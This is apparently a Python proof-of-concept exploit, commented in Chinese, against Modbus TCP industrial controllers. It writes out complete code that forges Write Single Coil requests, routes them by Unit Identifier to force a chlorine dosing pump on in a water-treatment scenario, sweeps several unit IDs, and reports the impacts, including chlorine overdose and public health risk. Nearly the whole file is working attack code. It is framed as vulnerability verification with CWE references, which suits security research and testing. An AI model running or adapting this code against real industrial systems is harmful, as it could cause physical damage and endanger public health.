#!/usr/bin/env python3
"""
POC: Write Single Coil - Unit Identifier (FC=05)

验证攻击者可通过 MBAP Header 中的 Unit Identifier 字段，
将 FC=05 请求路由到特定 PLC（氯化投加泵控制器），强制启动关键设备。
结合 FC=05 Output Address + Unit Identifier 两个攻击面。
"""

import socket
import struct
import time

TARGET_HOST = "172.20.0.10"
TARGET_PORT = 502
TIMEOUT = 5

CHLORINE_PUMP_COIL = 0x0013  # coil 19 — 氯化投加泵 RUN
COIL_ON  = 0xFF00
COIL_OFF = 0x0000

TARGET_UNIT_ID = 0x03  # PLC 3 — 氯化投加系统

UNIT_IDS_TO_TEST = [
    (0x01, "默认 unit_id"),
    (0x03, "POC 目标 — 氯化投加 PLC"),
    (0x00, "广播地址"),
    (0xFF, "最大值"),
    (0x7F, "随机值"),
]


def build_fc05_request(txn_id, unit_id, coil_addr, value):
    pdu = struct.pack('>BHH', 0x05, coil_addr, value)
    length = 1 + len(pdu)
    mbap = struct.pack('>HHHB', txn_id, 0x0000, length, unit_id)
    return mbap + pdu


def build_fc01_request(txn_id, unit_id, start_addr, quantity):
    pdu = struct.pack('>BHH', 0x01, start_addr, quantity)
    length = 1 + len(pdu)
    mbap = struct.pack('>HHHB', txn_id, 0x0000, length, unit_id)
    return mbap + pdu


def send_recv(sock, data, label=""):
    hex_out = ' '.join(f'{b:02x}' for b in data)
    print(f"  [TX] {label}")
    print(f"       {hex_out}")
    sock.sendall(data)
    resp = sock.recv(1024)
    hex_in = ' '.join(f'{b:02x}' for b in resp)
    print(f"  [RX] {hex_in}")
    return resp


def parse_fc05_resp(resp):
    if len(resp) < 12:
        return None, "响应过短"
    fc = resp[7]
    if fc == 0x85:
        err = {1: "ILLEGAL_FUNCTION", 2: "ILLEGAL_DATA_ADDRESS",
               3: "ILLEGAL_DATA_VALUE", 4: "SLAVE_DEVICE_FAILURE"}
        return None, f"异常: {err.get(resp[8], f'0x{resp[8]:02X}')}"
    if fc == 0x05:
        uid = resp[6]
        addr = struct.unpack('>H', resp[8:10])[0]
        val = struct.unpack('>H', resp[10:12])[0]
        return {"unit_id": uid, "addr": addr, "value": val}, "成功"
    return None, f"未知FC: 0x{fc:02X}"


def parse_fc01_resp(resp):
    if len(resp) < 10:
        return None, "响应过短"
    fc = resp[7]
    if fc == 0x81:
        return None, f"读取异常: 0x{resp[8]:02X}"
    if fc == 0x01:
        bc = resp[8]
        bits = []
        for i in range(bc):
            byte_val = resp[9 + i]
            for bit in range(8):
                bits.append((byte_val >> bit) & 1)
        return bits, "成功"
    return None, f"未知FC: 0x{fc:02X}"


def run_poc():
    print("=" * 70)
    print("POC: Write Single Coil - Unit Identifier 验证")
    print("=" * 70)
    print(f"目标: {TARGET_HOST}:{TARGET_PORT}")
    print(f"攻击线圈: 0x{CHLORINE_PUMP_COIL:04X} (氯化投加泵 RUN)")
    print(f"攻击 Unit ID: 0x{TARGET_UNIT_ID:02X} (PLC 3 — 氯化投加系统)")
    print(f"攻击值: 0xFF00 (ON — 强制启动泵)")
    print()

    # =============================================================
    # 阶段 1: 初始化 — 确保线圈为 OFF（泵停止）
    # =============================================================
    print("-" * 70)
    print("阶段 1: 初始化 — 确保氯化投加泵处于停止状态")
    print("-" * 70)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    req = build_fc05_request(0x0001, 0x01, CHLORINE_PUMP_COIL, COIL_OFF)
    resp = send_recv(sock, req,
        f"FC=05 unit_id=0x01, coil[0x{CHLORINE_PUMP_COIL:04X}]=OFF")
    result, msg = parse_fc05_resp(resp)
    print(f"  -> {msg}")

    time.sleep(0.3)

    # 读取确认
    req = build_fc01_request(0x0002, 0x01, CHLORINE_PUMP_COIL, 1)
    resp = send_recv(sock, req, "FC=01 读取线圈状态")
    bits, msg = parse_fc01_resp(resp)
    if bits:
        state = "ON" if bits[0] else "OFF"
        print(f"  [OK] 线圈 0x{CHLORINE_PUMP_COIL:04X} = {state} (泵已停止)")

    sock.close()
    print()

    # =============================================================
    # 阶段 2: 核心攻击 — unit_id=0x03 + FC=05 强制启动泵
    # =============================================================
    print("-" * 70)
    print("阶段 2: 核心攻击 — unit_id=0x03 + FC=05 强制启动氯化泵")
    print("-" * 70)

    print(f"\n  攻击报文构造 (与 POC 文档完全一致):")
    print(f"    MBAP transaction_id: 0x0001")
    print(f"    MBAP protocol_id:    0x0000")
    print(f"    MBAP length:         0x0006")
    print(f"    MBAP unit_id:        0x{TARGET_UNIT_ID:02X} ← 路由到氯化投加 PLC")
    print(f"    PDU function_code:   0x05 (Write Single Coil)")
    print(f"    PDU output_address:  0x{CHLORINE_PUMP_COIL:04X} (泵 RUN 指令)")
    print(f"    PDU output_value:    0xFF00 (ON — 强制启动)")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    req = build_fc05_request(0x0003, TARGET_UNIT_ID, CHLORINE_PUMP_COIL, COIL_ON)
    print("  --- 发送攻击报文 ---")
    resp = send_recv(sock, req,
        f"FC=05 unit_id=0x{TARGET_UNIT_ID:02X}, "
        f"coil[0x{CHLORINE_PUMP_COIL:04X}]=ON")
    result, msg = parse_fc05_resp(resp)

    attack_ok = False
    if result:
        val_str = "ON" if result['value'] == COIL_ON else "OFF"
        print(f"\n  [!] 攻击成功!")
        print(f"      响应 unit_id: 0x{result['unit_id']:02X}")
        print(f"      响应地址: 0x{result['addr']:04X}")
        print(f"      响应值: 0x{result['value']:04X} ({val_str})")
        attack_ok = True
    else:
        print(f"\n  [X] 攻击失败: {msg}")

    time.sleep(0.3)

    # 验证线圈状态变更
    print("\n  --- 验证线圈状态 ---")
    req = build_fc01_request(0x0004, 0x01, CHLORINE_PUMP_COIL, 1)
    resp = send_recv(sock, req, "FC=01 读取线圈状态")
    bits, msg = parse_fc01_resp(resp)
    if bits:
        state = "ON" if bits[0] else "OFF"
        if bits[0]:
            print(f"  [!] 确认: 线圈 0x{CHLORINE_PUMP_COIL:04X} = {state}")
            print(f"      氯化投加泵已被强制启动!")
        else:
            print(f"  [?] 线圈 0x{CHLORINE_PUMP_COIL:04X} = {state} (未变更)")

    sock.close()
    print()

    # =============================================================
    # 阶段 3: 多 Unit ID 遍历 — 所有 unit_id + FC=05 均被接受
    # =============================================================
    print("-" * 70)
    print("阶段 3: 遍历多个 Unit ID — 验证 FC=05 对任意 unit_id 均接受")
    print("-" * 70)
    print()

    results_table = []
    txn = 0x0010

    for uid, desc in UNIT_IDS_TO_TEST:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        try:
            sock.connect((TARGET_HOST, TARGET_PORT))

            # 先设 OFF
            req = build_fc05_request(txn, uid, CHLORINE_PUMP_COIL, COIL_OFF)
            sock.sendall(req)
            sock.recv(1024)
            time.sleep(0.1)

            # 写 ON
            req = build_fc05_request(txn + 1, uid, CHLORINE_PUMP_COIL, COIL_ON)
            resp = send_recv(sock, req,
                f"FC=05 unit_id=0x{uid:02X}, coil=ON")
            w_result, w_msg = parse_fc05_resp(resp)
            time.sleep(0.2)

            # 回读
            req = build_fc01_request(txn + 2, uid, CHLORINE_PUMP_COIL, 1)
            resp = send_recv(sock, req,
                f"FC=01 unit_id=0x{uid:02X}, 读取线圈")
            bits, r_msg = parse_fc01_resp(resp)

            write_ok = w_result is not None
            resp_uid = w_result['unit_id'] if w_result else None
            read_val = bits[0] if bits else None
            match = (read_val == 1) if read_val is not None else False

            results_table.append((uid, desc, write_ok, resp_uid, read_val, match))

            status = "✓ 接受" if (write_ok and match) else "✗ 拒绝"
            r_uid = f"0x{resp_uid:02X}" if resp_uid is not None else "N/A"
            state = "ON" if read_val else "OFF" if read_val is not None else "N/A"
            print(f"    {status} | unit_id=0x{uid:02X} | 响应UID={r_uid} | "
                  f"线圈={state}")
            print()

            txn += 3
        except Exception as e:
            print(f"    ✗ 错误: {e}")
            results_table.append((uid, desc, False, None, None, False))
        finally:
            sock.close()
            time.sleep(0.2)

    # =============================================================
    # 阶段 4: 恢复
    # =============================================================
    print("-" * 70)
    print("阶段 4: 恢复")
    print("-" * 70)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    req = build_fc05_request(0x00FF, 0x01, CHLORINE_PUMP_COIL, COIL_OFF)
    resp = send_recv(sock, req, "FC=05 恢复线圈为 OFF")
    print(f"  [OK] 线圈 0x{CHLORINE_PUMP_COIL:04X} 已恢复为 OFF")
    sock.close()

    # =============================================================
    # 汇总
    # =============================================================
    print()
    print("=" * 70)
    print("验证结果汇总")
    print("=" * 70)
    print()

    print(f"  {'Unit ID':<12} {'描述':<30} {'写入':<8} {'响应UID':<10} {'线圈':<8} {'命中':<6}")
    print(f"  {'-'*12} {'-'*30} {'-'*8} {'-'*10} {'-'*8} {'-'*6}")

    ok_count = 0
    for uid, desc, write_ok, resp_uid, read_val, match in results_table:
        w = "✓" if write_ok else "✗"
        r = f"0x{resp_uid:02X}" if resp_uid is not None else "N/A"
        rv = "ON" if read_val else "OFF" if read_val is not None else "N/A"
        m = "✓" if match else "✗"
        print(f"  0x{uid:02X}         {desc:<30} {w:<8} {r:<10} {rv:<8} {m}")
        if match:
            ok_count += 1

    print()
    print(f"  测试 {len(UNIT_IDS_TO_TEST)} 个 Unit ID，{ok_count} 个被接受")
    print()

    if attack_ok and ok_count == len(UNIT_IDS_TO_TEST):
        print("  [!] 安全发现: FC=05 + Unit Identifier 组合攻击全部成功!")
        print("      攻击者可通过任意 Unit ID 将 FC=05 请求路由到任意下游 PLC，")
        print("      精确操控目标设备的线圈状态。")
        print()
        print("  [!] 攻击影响 (水处理厂场景):")
        print(f"      Unit ID=0x{TARGET_UNIT_ID:02X} → PLC 3 (氯化投加系统)")
        print(f"      线圈 0x{CHLORINE_PUMP_COIL:04X}: OFF → ON (泵强制启动)")
        print("      - 过量投加氯气")
        print("      - 违反水质法规限值")
        print("      - 损坏下游管道/设备")
        print("      - 公共健康安全风险")
        print()
        print("  CWE 分类:")
        print("    - CWE-287: Improper Authentication")
        print("    - CWE-284: Improper Access Control")
        print("    - CWE-306: Missing Authentication for Critical Function")

    print()
    print("=" * 70)
    print("POC 验证完成")
    print("=" * 70)


if __name__ == "__main__":
    run_poc()
